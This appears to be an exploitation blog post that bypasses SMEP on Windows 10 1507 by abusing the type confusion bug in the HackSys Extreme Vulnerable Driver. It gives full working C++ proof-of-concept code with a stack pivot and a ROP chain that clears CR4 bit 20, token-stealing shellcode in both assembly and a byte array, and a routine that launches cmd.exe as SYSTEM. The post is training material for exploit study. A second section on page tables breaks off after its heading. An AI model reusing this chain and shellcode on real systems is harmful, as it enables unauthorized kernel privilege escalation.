---
title: "Bypassing SMEP"
date: 2025-04-19 11:39:03 +/-0200
categories: [exploit, Windows]
tags: [smep]     # TAG names should always be lowercase
---

Good morning, in this blog post we’re going to take a deep dive into the **SMEP** mitigation or _Supervisor Mode Execution Prevention_. This is a security feature present in modern Intel processors (starting from the Ivy Bridge architecture), and its purpose is to prevent kernel-mode code (supervisor mode) from executing code located in user-space memory.

For example, a 170-byte allocated buffer that contains one of the shellcodes discussed in the previous blog ([Windows Kernel Shellcode](https://r0keb.github.io/posts/Windows-Kernel-Shellcode/)).

# When, Where and How?
**SMEP** is located in bit number 20 of the `CR4` register, as we can see below in our target operating system:

```WinDbg
3: kd> .formats cr4
Evaluate expression:
  Hex:     00000000`001506f8
  Decimal: 1378040
  Decimal (unsigned) : 1378040
  Octal:   0000000000000005203370
  Binary:  00000000 00000000 00000000 00000000 00000000 00010101 00000110 11111000
  Chars:   ........
  Time:    Fri Jan 16 23:47:20 1970
  Float:   low 1.93105e-039 high 0
  Double:  6.80842e-318
```

We already saw in the previous blog how to disable this mitigation manually using WinDbg, but this time we’re going to do it programmatically in two different ways, each one exploiting a different vulnerability.

- Type Confusion (evasion - ROP chain)
- Write-What-Where (evasion - Modify Page Tables)

Before proceeding, big thanks to the [HackSys Team](https://github.com/hacksysteam) for developing HEVD, which helps many Windows exploitation enthusiasts practice with open source code and tons of public documentation.

That’s right, we’ll be using [HEVD](https://github.com/hacksysteam/HackSysExtremeVulnerableDriver) for both POCs, so without further delay, let’s get to it.

**NOTE: The goal of both POCs is to evade `SMEP` programmatically and explain the exploited vulnerability in each case: Type Confusion and Arbitrary Read-Write respectively.**

## ROP Chain
**`Windows 10 1507`**

The idea is that once we control the execution flow of the kernel thread, we jump to various kernel addresses that allow us to make modifications without switching to user space. This sets the stage for executing our shellcode in UM.

As I mentioned before, let’s first focus on the vulnerability and how to exploit it, in this case `Type Confusion`.

Target Windows host version → `Windows 10 1507`
### Type Confusion Vuln (HEVD)
We have these three functions

![](imgs/blog/2SmepBypass/20250330172511.png)

But only `TriggerTypeConfusion` is the one we are going to "reverse"
```cpp
...
      if ( (unsigned int)LowPart > 0x22201F )
      {
        switch ( (_DWORD)LowPart )
        {
          case 0x222023:
            DbgPrintEx(0x4Du, 3u, "****** HEVD_IOCTL_TYPE_CONFUSION ******\n");
            FakeObjectNonPagedPoolNxIoctlHandler = TypeConfusionIoctlHandler(Irp, CurrentStackLocation);
            v7 = "****** HEVD_IOCTL_TYPE_CONFUSION ******\n";
            goto LABEL_62;
...
```
As we can see, the ioctl code is `0x222023` so we can call that function from the user mode using **`DeviceIoControl`** specifying that code.

If we check `TypeConfusionIoctlHanlder` we can see that it is just a wrapper to the actual function
```cpp
int __fastcall TypeConfusionIoctlHandler(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)
{
  _NAMED_PIPE_CREATE_PARAMETERS *Parameters; // rcx
  int result; // eax

  Parameters = IrpSp->Parameters.CreatePipe.Parameters;
  result = -1073741823;
  if ( Parameters )
    return TriggerTypeConfusion((_USER_TYPE_CONFUSION_OBJECT *)Parameters);
  return result;
}
```
But the **`TriggerTypeConfusion`** function is called with a structure as a parameter.

Well, that structure is how we exploit the vuln:
```cpp
...
typedef struct _USER_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;
...
typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
    ULONG_PTR ObjectID;
    union
    {
        ULONG_PTR ObjectType;
        FunctionPointer Callback;
    };
} KERNEL_TYPE_CONFUSION_OBJECT, *PKERNEL_TYPE_CONFUSION_OBJECT;
...
```
We have these two structures which coincidentally have the same byte size. This is why we can take advantage of the `union` under the kernel structure and exploit the vuln.

These structures are used in **`TriggerTypeConfusion`**, so let’s take a look:
```cpp
__int64 __fastcall TriggerTypeConfusion(_USER_TYPE_CONFUSION_OBJECT *UserTypeConfusionObject)
{
  _KERNEL_TYPE_CONFUSION_OBJECT *PoolWithTag; // r14
  unsigned int v4; // ebx

  ProbeForRead(UserTypeConfusionObject, 0x10ui64, 1u);
  PoolWithTag = (_KERNEL_TYPE_CONFUSION_OBJECT *)ExAllocatePoolWithTag(NonPagedPool, 0x10ui64, 0x6B636148u);
  if ( PoolWithTag )
  {
    DbgPrintEx(0x4Du, 3u, "[+] Pool Tag: %s\n", "'kcaH'");
    DbgPrintEx(0x4Du, 3u, "[+] Pool Type: %s\n", "NonPagedPool");
    DbgPrintEx(0x4Du, 3u, "[+] Pool Size: 0x%X\n", 0x10i64);
    DbgPrintEx(0x4Du, 3u, "[+] Pool Chunk: 0x%p\n", PoolWithTag);
    DbgPrintEx(0x4Du, 3u, "[+] UserTypeConfusionObject: 0x%p\n", UserTypeConfusionObject);
    DbgPrintEx(0x4Du, 3u, "[+] KernelTypeConfusionObject: 0x%p\n", PoolWithTag);
    DbgPrintEx(0x4Du, 3u, "[+] KernelTypeConfusionObject Size: 0x%X\n", 0x10i64);
    PoolWithTag->ObjectID = UserTypeConfusionObject->ObjectID;
    PoolWithTag->ObjectType = UserTypeConfusionObject->ObjectType;
    DbgPrintEx(0x4Du, 3u, "[+] KernelTypeConfusionObject->ObjectID: 0x%p\n", (const void *)PoolWithTag->ObjectID);
    DbgPrintEx(0x4Du, 3u, "[+] KernelTypeConfusionObject->ObjectType: 0x%p\n", PoolWithTag->Callback);
    DbgPrintEx(0x4Du, 3u, "[+] Triggering Type Confusion\n");
    v4 = TypeConfusionObjectInitializer(PoolWithTag);
    DbgPrintEx(0x4Du, 3u, "[+] Freeing KernelTypeConfusionObject Object\n");
    DbgPrintEx(0x4Du, 3u, "[+] Pool Tag: %s\n", "'kcaH'");
    DbgPrintEx(0x4Du, 3u, "[+] Pool Chunk: 0x%p\n", PoolWithTag);
    ExFreePoolWithTag(PoolWithTag, 0x6B636148u);
    return v4;
  }
  else
  {
    DbgPrintEx(0x4Du, 3u, "[-] Unable to allocate Pool chunk\n");
    return 3221225495i64;
  }
}
```
We see a bunch of `DbgPrintEx` statements, so let’s focus on the important lines and explain each one with code comments:
```cpp
// __fastcall calling convention so the pointer to _USER_TYPE_CONFUSION_OBJECT goes on the rcx register
__int64 __fastcall TriggerTypeConfusion(_USER_TYPE_CONFUSION_OBJECT *UserTypeConfusionObject)
{
  // Declare the other structure type
  _KERNEL_TYPE_CONFUSION_OBJECT *PoolWithTag; // r14
  unsigned int v4; // ebx

  // checks if the data is in the user mode and if it is aligned
  ProbeForRead(UserTypeConfusionObject, 0x10ui64, 1u);
  // Allocate the structure in the heap with tag "0x6B636148"
  // the data it's not paged!!!
  // as we see, there is only 10 hex in size, enough to allocate 2 pointers (8 bytes x 2)
  PoolWithTag = (_KERNEL_TYPE_CONFUSION_OBJECT *)ExAllocatePoolWithTag(NonPagedPool, 0x10ui64, 0x6B636148u);
  if ( PoolWithTag )
  {
    ...
    // TYPE CONFUSION ALERT
    // set the contents inside user structure to the kernel structure
    PoolWithTag->ObjectID = UserTypeConfusionObject->ObjectID;
    PoolWithTag->ObjectType = UserTypeConfusionObject->ObjectType;
    ...
    // call TypeConfusionObjectInitializer with our structure as an argument
    v4 = TypeConfusionObjectInitializer(PoolWithTag);
	...
	// release the kernel space
	ExFreePoolWithTag(PoolWithTag, 0x6B636148u);
    return v4;
  }
  else
  {
    ...
    return 0xC0000017i64;
  }
}
```

So far so good, now let’s check **`TypeConfusionObjectInitializer`** since we don’t see any execution in the code above:
```cpp
__int64 __fastcall TypeConfusionObjectInitializer(_KERNEL_TYPE_CONFUSION_OBJECT *KernelTypeConfusionObject)
{
  DbgPrintEx(0x4Du, 3u, "[+] KernelTypeConfusionObject->Callback: 0x%p\n", KernelTypeConfusionObject->Callback);
  DbgPrintEx(0x4Du, 3u, "[+] Calling Callback\n");
  ((void (*)(void))KernelTypeConfusionObject->ObjectType)();
  DbgPrintEx(0x4Du, 3u, "[+] Kernel Type Confusion Object Initialized\n");
  return 0i64;
}
```
This code simply takes the first 8 bytes of the buffer and executes the code pointed to by it. So it works like a function pointer.

The key is that we need to change the `ObjectType` value in our user structure—that’s the only important parameter:
```cpp
...
    PoolWithTag->ObjectType = UserTypeConfusionObject->ObjectType;
...
```
If we can change that parameter to a stack pivoting gadget, we could escalate privileges.

What’s a Stack Pivot???! Great question. In exploits like this, which only allow us to redirect execution to one address, we use this to point to a gadget that changes the stack to another location—aka, an address with instructions like `mov esp, 0x<Aligned Address> ; ret`.

This allows the next `ret` to execute the following address from the new stack, which we can fully control.
![](imgs/blog/2SmepBypass/20250419174056.png)
That’s the idea.

FYI, we’re going to use `rp++` to find gadgets. For this example, we’ll show a POC using a stack pivot and NOP gadgets.

Quick side note—what’s a gadget? A gadget is code inside kernel space that lets us do specific operations within kernel address space, meaning `SMEP` won’t bother us, since it only triggers when switching to user-space code (at least on this kernel version).

As mentioned earlier, we’re using [rp++](https://github.com/0vercl0k/rp), which is in my opinion the easiest and fastest tool to find gadgets. All you need is a copy of `ntoskrnl.exe`, and pass it to the tool.

![](imgs/blog/2SmepBypass/20250330175320.png)
Now we can check the output using any text editor.

```asm
...
0x140007dfa: nop ; ret ; (40 found)
...
0x140522840: mov esp, 0xE8000000 ; ret ; (1 found)
...
```

[NOPs]

![](imgs/blog/2SmepBypass/20250330175106.png)

[stack pivoting]

![](imgs/blog/2SmepBypass/20250330175427.png)

Then we implement it in our code:
```cpp
#include <stdio.h>
#include <windows.h>

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
);


typedef struct _USER_TYPE_CONFUSION_OBJECT
{
	ULONG_PTR ObjectID;
	ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;



typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
	ULONG_PTR ObjectID;
	union
	{
		ULONG_PTR ObjectType;
		UINT64* Callback;
	};
} KERNEL_TYPE_CONFUSION_OBJECT, * PKERNEL_TYPE_CONFUSION_OBJECT;



UINT64 GetNtBase() {
	NTSTATUS Status = 0x0;
	ULONG ReturnLength = 0;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

	if (NtQuerySystemInformation == nullptr) {
		printf("\n[ERROR GETTING THE ADDRESS TO \"NtQuerySystemInformation\"]\n");
		return 0;
	}

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &ReturnLength);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr, ReturnLength,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, ReturnLength, &ReturnLength);
	if (Status != 0x0) {
		printf("\nError getting the length of the Module Struct -> 0x%0.16X\n", Status);
		return 0;
	}

	printf("\n[Module Name] %s\n\t\\__[Base Address] 0x%p\n\t\\__[Module Size] %d\n",
		pModuleInfo->Modules[0].Name, pModuleInfo->Modules[0].ImageBaseAddress, pModuleInfo->Modules[0].ImageSize);

	char* ModuleName = pModuleInfo->Modules[0].Name;
	PVOID ModuleBase = pModuleInfo->Modules[0].ImageBaseAddress;
	ULONG ModuleSize = pModuleInfo->Modules[0].ImageSize;

	printf("\npModuleInfo->Modules[0] -> 0x%p\n", pModuleInfo->Modules[0]);

	VirtualFree(pModuleInfo, ReturnLength, MEM_RELEASE);

	return (UINT64)ModuleBase;
}


int main() {

	UINT64 KernelBase = GetNtBase();

	if (KernelBase == 0) {
		printf("\n[!] ERROR GETTING THE KERNEL BASE ADDRESS\n");
		getchar();
		return -1;
	}
	printf("\n[KERNEL BASE] -> 0x%p\n", KernelBase);

	HANDLE hHEVD = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),
		0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hHEVD == INVALID_HANDLE_VALUE) {
		printf("\nError getting a handle to the driver\n");
		// getchar();
		//return -1;
	}
	printf("\nHANDLE created successfully!\n");

	// Gadgets:
	// 0x140522840: mov esp, 0xE8000000 ; ret ; (1 found)

	UINT64 StackPivotGadget = KernelBase + 0x522840;
	volatile UINT64 STACK_PIVOT = 0xE8000000;
	UINT64 NopGadget = KernelBase + 0x7dfa;

	UINT64 StackAddr = STACK_PIVOT - 0x1000;
	
	LPVOID KernelStack = VirtualAlloc((LPVOID)StackAddr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (KernelStack == 0) {
		printf("\nERROR ALLOCATING THE BUFFER -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	if(!VirtualLock(KernelStack, 0x10000)){
		printf("\nERROR LOCKING THE MEMORY RANGE -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	memset(KernelStack, 0x41, 0x1000);

	USER_TYPE_CONFUSION_OBJECT UserStruct = { 0 };
	UserStruct.ObjectID = 0x4141414141414141; // dumy value
	UserStruct.ObjectType = StackPivotGadget;

	memcpy((UINT64*)STACK_PIVOT, &NopGadget, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 1, &NopGadget, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 2, &NopGadget, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 3, &NopGadget, sizeof(UINT64));

	ULONG lpBytesReturned = 0;
	if (!DeviceIoControl(hHEVD, 0x222023, &UserStruct, sizeof(USER_TYPE_CONFUSION_OBJECT), nullptr, 0, &lpBytesReturned, nullptr)) {
		printf("\n[Error triggering Type Confusion]\n");
		// getchar();
		// return -1;
	}

	VirtualFree(KernelStack, 0x10000, MEM_RELEASE);

	getchar();

	CloseHandle(hHEVD);
	return 0;
}
```

Now let’s set a breakpoint at the beginning of the function:
```WinDbg
1: kd> bp TriggerTypeConfusion
1: kd> g
Breakpoint 0 hit
HEVD!TriggerTypeConfusion:
fffff800`23e27314 488bc4          mov     rax,rsp
```

![](imgs/blog/2SmepBypass/20250330201701.png)
The breakpoint hits. We can see where the code executes the function pointer.
![](imgs/blog/2SmepBypass/20250330201721.png)

![](imgs/blog/2SmepBypass/20250330201632.png)
That’s the line where our function pointer gets executed.
We can check that in IDA too
![](imgs/blog/2SmepBypass/20250330201902.png)

```WinDbg
0: kd> bp fffff800`60c6754b
0: kd> g
Breakpoint 1 hit
HEVD!TypeConfusionObjectInitializer+0x37:
fffff800`60c6754b ff5308          call    qword ptr [rbx+8]
```
After we set a breakpoint there, we can follow the execution flow:
```WinDbg
0: kd> t
nt!CcZeroData+0x5c:
fffff803`8e132840 bc000000e8      mov     esp,0E8000000h
0: kd> 
nt!CcZeroData+0x61:
fffff803`8e132845 c3              ret
0: kd> k
 # Child-SP          RetAddr               Call Site
00 00000000`e8000000 00000000`00000000     nt!CcZeroData+0x61
0: kd> t
nt!KiQuantumEnd+0xaea:
fffff803`8dc17dfa 90              nop
0: kd> t
nt!KiQuantumEnd+0xaeb:
fffff803`8dc17dfb c3              ret
0: kd> 
nt!KiQuantumEnd+0xaea:
fffff803`8dc17dfa 90              nop
0: kd> 
nt!KiQuantumEnd+0xaeb:
fffff803`8dc17dfb c3              ret
0: kd> 
nt!KiQuantumEnd+0xaea:
fffff803`8dc17dfa 90              nop
0: kd> 
nt!KiQuantumEnd+0xaeb:
fffff803`8dc17dfb c3              ret
0: kd> 
nt!KiQuantumEnd+0xaea:
fffff803`8dc17dfa 90              nop
0: kd> 
nt!KiQuantumEnd+0xaeb:
fffff803`8dc17dfb c3              ret
```

As we can see, we’re able to execute code with stack pivoting. Now we need to:
- [ ] Disable SMEP
- [ ] Run our UM shellcode
- [ ] Return to the UM without BSOD

First of all, we need a shellcode to escalate privileges:
```nasm
BITS 64

section .text

xor rax, rax
xor r9, r9
xor rcx, rcx

mov rax, qword [gs:0x188]
mov rax, qword [rax + 0x220]
mov r9, rax

GetSystemProcess:
	mov r9, qword [r9 + 0x2f0]
	sub r9, 0x2f0
	mov rcx, qword [r9 + 0x2e8]
	cmp rcx, 4
	jne GetSystemProcess

add rax, 0x358

mov r9, qword [r9 + 0x358]
mov [rax], r9

nop

  ; Kristal implementation (https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html)
  mov rax, [gs:0x188]       ; _KPCR.Prcb.CurrentThread
  mov cx, [rax + 0x1e4]     ; KTHREAD.KernelApcDisable
  inc cx
  mov [rax + 0x1e4], cx
  mov rdx, [rax + 0x90]     ; ETHREAD.TrapFrame
  mov rcx, [rdx + 0x168]    ; ETHREAD.TrapFrame.Rip
  mov r11, [rdx + 0x178]    ; ETHREAD.TrapFrame.EFlags
  mov rsp, [rdx + 0x180]    ; ETHREAD.TrapFrame.Rsp
  mov rbp, [rdx + 0x158]    ; ETHREAD.TrapFrame.Rbp
  xor eax, eax  ;
  swapgs
  o64 sysret

ret

end
```
In our shellcode we use Kristal’s return-to-UM routine from [SYSRET_SHELLCODE](https://kristal-g.github.io/2021/05/08/SYSRET_Shellcode.html), which allows us to return to UM using the correct values and the `sysret` instruction.

We just get the **system** token and assign it to our current process.

Now we need to bypass SMEP by clearing the 20th bit in the `cr4` register.

For that, we’re going to allocate some gadgets on the stack:
```
...
0x14014f349: add al, ch ; pop rcx ; ret ; (2 found)
...
0x14007274e: mov cr4, rcx ; ret ; (2 found)
...
```

As always, we need to get the `cr4` value without the 20th bit:
```WinDbg
3: kd> .formats cr4
Evaluate expression:
  Hex:     00000000`001506f8
  Decimal: 1378040
  Decimal (unsigned) : 1378040
  Octal:   0000000000000005203370
  Binary:  00000000 00000000 00000000 00000000 00000000 00010101 00000110 11111000
  Chars:   ........
  Time:    Fri Jan 16 23:47:20 1970
  Float:   low 1.93105e-039 high 0
  Double:  6.80842e-318
```

`00010101 00000110 11111000` = `0x506f8`

Let's implement those in our code:
```cpp
...
	UINT64 StackPivotGadget = KernelBase + 0x522840;
	volatile UINT64 STACK_PIVOT = 0xE8000000;
	UINT64 PopRcx = KernelBase + 0x14f34b;
	UINT64 RcxValue = 0x506F8;
	UINT64 ModCr4 = KernelBase + 0x7274e;

	UINT64 StackAddr = STACK_PIVOT - 0x1000;

	LPVOID KernelStack = VirtualAlloc((LPVOID)StackAddr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (KernelStack == 0) {
		printf("\nERROR ALLOCATING THE BUFFER -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	if (!VirtualLock(KernelStack, 0x10000)) {
		printf("\nERROR LOCKING THE MEMORY RANGE -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	memset(KernelStack, 0x41, 0x1000);

	PVOID pShell = VirtualAlloc(nullptr, 150, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(pShell, pShellcode, 150);

	USER_TYPE_CONFUSION_OBJECT UserStruct = { 0 };
	UserStruct.ObjectID = 0x4141414141414141;
	UserStruct.ObjectType = StackPivotGadget;

	// memcpy((UINT64*)STACK_PIVOT, &DumyRbxVal, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT, &PopRcx, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 1, &RcxValue, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 2, &ModCr4, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 3, &pShell, sizeof(UINT64));
...
```

```WinDbg
0: kd> g
Breakpoint 1 hit
HEVD!TypeConfusionObjectInitializer+0x37:
fffff800`b528754b ff5308          call    qword ptr [rbx+8]
0: kd> t
nt!CcZeroData+0x5c:
fffff803`7639b840 bc000000e8      mov     esp,0E8000000h
0: kd> 
nt!CcZeroData+0x61:
fffff803`7639b845 c3              ret
0: kd> 
nt!KiIsrLinkage+0x16b:
fffff803`75fc834b 59              pop     rcx
0: kd> 
nt!KiIsrLinkage+0x16c:
fffff803`75fc834c c3              ret
0: kd> 
nt!KiFlushCurrentTbWorker+0x12:
fffff803`75eeb74e 0f22e1          mov     cr4,rcx
0: kd> 
nt!KiFlushCurrentTbWorker+0x15:
fffff803`75eeb751 c3              ret
// UM code executing
0: kd> 
0000005c`f9500000 4831c0          xor     rax,rax
0: kd> 
0000005c`f9500003 4d31c9          xor     r9,r9
...
```

Once everything is in place, we can execute our code.
![](imgs/blog/2SmepBypass/20250330222640.png)


```cpp

#include <stdio.h>
#include <windows.h>

#define MAXIMUM_FILENAME_LENGTH 255 

typedef struct SYSTEM_MODULE {
	ULONG                Reserved1;
	ULONG                Reserved2;
#ifdef _WIN64
	ULONG				Reserved3;
#endif
	PVOID                ImageBaseAddress;
	ULONG                ImageSize;
	ULONG                Flags;
	WORD                 Id;
	WORD                 Rank;
	WORD                 w018;
	WORD                 NameOffset;
	CHAR                 Name[MAXIMUM_FILENAME_LENGTH];
}SYSTEM_MODULE, * PSYSTEM_MODULE;

typedef struct SYSTEM_MODULE_INFORMATION {
	ULONG                ModulesCount;
	SYSTEM_MODULE        Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemModuleInformation = 11
} SYSTEM_INFORMATION_CLASS;

typedef NTSTATUS(*_NtQuerySystemInformation)(
	SYSTEM_INFORMATION_CLASS SystemInformationClass,
	PVOID                    SystemInformation,
	ULONG                    SystemInformationLength,
	PULONG                   ReturnLength
	);


typedef struct _USER_TYPE_CONFUSION_OBJECT
{
	ULONG_PTR ObjectID;
	ULONG_PTR ObjectType;
} USER_TYPE_CONFUSION_OBJECT, * PUSER_TYPE_CONFUSION_OBJECT;



typedef struct _KERNEL_TYPE_CONFUSION_OBJECT
{
	ULONG_PTR ObjectID;
	union
	{
		ULONG_PTR ObjectType;
		UINT64* Callback;
	};
} KERNEL_TYPE_CONFUSION_OBJECT, * PKERNEL_TYPE_CONFUSION_OBJECT;



char pShellcode[] = {
	0x48, 0x31, 0xC0, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC9, 0x65,
	0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x80, 0x20, 0x02, 0x00, 0x00, 0x49, 0x89, 0xC1, 0x4D, 0x8B,
	0x89, 0xF0, 0x02, 0x00, 0x00, 0x49, 0x81, 0xE9, 0xF0, 0x02,
	0x00, 0x00, 0x49, 0x8B, 0x89, 0xE8, 0x02, 0x00, 0x00, 0x48,
	0x83, 0xF9, 0x04, 0x75, 0xE5, 0x48, 0x05, 0x58, 0x03, 0x00,
	0x00, 0x4D, 0x8B, 0x89, 0x58, 0x03, 0x00, 0x00, 0x4C, 0x89,
	0x08, 0x90, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x88, 0x01, 0x00,
	0x00, 0x66, 0x8B, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x66, 0xFF,
	0xC1, 0x66, 0x89, 0x88, 0xE4, 0x01, 0x00, 0x00, 0x48, 0x8B,
	0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8B, 0x8A, 0x68, 0x01,
	0x00, 0x00, 0x4C, 0x8B, 0x9A, 0x78, 0x01, 0x00, 0x00, 0x48,
	0x8B, 0xA2, 0x80, 0x01, 0x00, 0x00, 0x48, 0x8B, 0xAA, 0x58,
	0x01, 0x00, 0x00, 0x31, 0xC0, 0x0F, 0x01, 0xF8, 0x48, 0x0F,
	0x07, 0xC3, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90
};



void SpawnShell() {

	PROCESS_INFORMATION Pi = { 0 };
	STARTUPINFOW Si = { 0 };
	Si.cb = sizeof(STARTUPINFOW);

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe", nullptr, nullptr, nullptr, false, CREATE_NEW_CONSOLE, nullptr, nullptr, &Si, &Pi);
}







UINT64 GetNtBase() {
	NTSTATUS Status = 0x0;
	ULONG ReturnLength = 0;

	_NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation");

	if (NtQuerySystemInformation == nullptr) {
		printf("\n[ERROR GETTING THE ADDRESS TO \"NtQuerySystemInformation\"]\n");
		return 0;
	}

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, nullptr, 0, &ReturnLength);

	PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)VirtualAlloc(nullptr, ReturnLength,
		MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	Status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)11, pModuleInfo, ReturnLength, &ReturnLength);
	if (Status != 0x0) {
		printf("\nError getting the length of the Module Struct -> 0x%0.16X\n", Status);
		return 0;
	}

	printf("\n[Module Name] %s\n\t\\__[Base Address] 0x%p\n\t\\__[Module Size] %d\n",
		pModuleInfo->Modules[0].Name, pModuleInfo->Modules[0].ImageBaseAddress, pModuleInfo->Modules[0].ImageSize);

	char* ModuleName = pModuleInfo->Modules[0].Name;
	PVOID ModuleBase = pModuleInfo->Modules[0].ImageBaseAddress;
	ULONG ModuleSize = pModuleInfo->Modules[0].ImageSize;

	printf("\npModuleInfo->Modules[0] -> 0x%p\n", pModuleInfo->Modules[0]);

	VirtualFree(pModuleInfo, ReturnLength, MEM_RELEASE);

	return (UINT64)ModuleBase;
}






int main() {

	UINT64 KernelBase = GetNtBase();

	if (KernelBase == 0) {
		printf("\n[!] ERROR GETTING THE KERNEL BASE ADDRESS\n");
		getchar();
		return -1;
	}
	printf("\n[KERNEL BASE] -> 0x%p\n", KernelBase);

	HANDLE hHEVD = CreateFileW(L"\\\\.\\HackSysExtremeVulnerableDriver", (GENERIC_READ | GENERIC_WRITE),
		0, nullptr, OPEN_EXISTING, 0, nullptr);
	if (hHEVD == INVALID_HANDLE_VALUE) {
		printf("\nError getting a handle to the driver\n");
		getchar();
		return -1;
	}
	printf("\nHANDLE created successfully!\n");

	UINT64 StackPivotGadget = KernelBase + 0x522840;
	volatile UINT64 STACK_PIVOT = 0xE8000000;
	UINT64 PopRcx = KernelBase + 0x14f34b;
	UINT64 RcxValue = 0x506F8;
	UINT64 ModCr4 = KernelBase + 0x7274e;

	UINT64 StackAddr = STACK_PIVOT - 0x1000;

	LPVOID KernelStack = VirtualAlloc((LPVOID)StackAddr, 0x10000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (KernelStack == 0) {
		printf("\nERROR ALLOCATING THE BUFFER -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	if (!VirtualLock(KernelStack, 0x10000)) {
		printf("\nERROR LOCKING THE MEMORY RANGE -> %d\n", GetLastError());
		getchar();
		return -1;
	}
	memset(KernelStack, 0x41, 0x1000);

	PVOID pShell = VirtualAlloc(nullptr, 150, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	memcpy(pShell, pShellcode, 150);

	USER_TYPE_CONFUSION_OBJECT UserStruct = { 0 };
	UserStruct.ObjectID = 0x4141414141414141;
	UserStruct.ObjectType = StackPivotGadget;

	memcpy((UINT64*)STACK_PIVOT, &PopRcx, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 1, &RcxValue, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 2, &ModCr4, sizeof(UINT64));
	memcpy((UINT64*)STACK_PIVOT + 3, &pShell, sizeof(UINT64));

	printf("\n[STACK_PIVOT] --> 0x%p\n", STACK_PIVOT);
	printf("\n[StackPivotGadget] --> 0x%p", StackPivotGadget);
	printf("\n[MyStack] --> 0x%p", KernelStack);
	printf("\n[PopRcx] --> 0x%p", PopRcx);
	printf("\n[RcxValue] --> 0x%p", RcxValue);
	printf("\n[ModCr4] --> 0x%p", ModCr4);
	printf("\n[pShell] --> 0x%p\n", pShell);

	// wetw0rk helps so much with this :)
	for (unsigned int i = 0; i < 4; i++) {
		Sleep(1000);
	}

	ULONG lpBytesReturned = 0;
	if (!DeviceIoControl(hHEVD, 0x222023, &UserStruct, sizeof(USER_TYPE_CONFUSION_OBJECT), nullptr, 0, &lpBytesReturned, nullptr)) {
		printf("\n[Error triggering Type Confusion]\n");
		// getchar();
		// return -1;
	}

	SpawnShell();

	VirtualFree(pShell, 150, MEM_RELEASE);
	VirtualFree(KernelStack, 0x14000, MEM_RELEASE);

	getchar();

	CloseHandle(hHEVD);
	return 0;
}
```

## Bypassing SMEP through Page Table Entries
**`Windows 10 1507`**

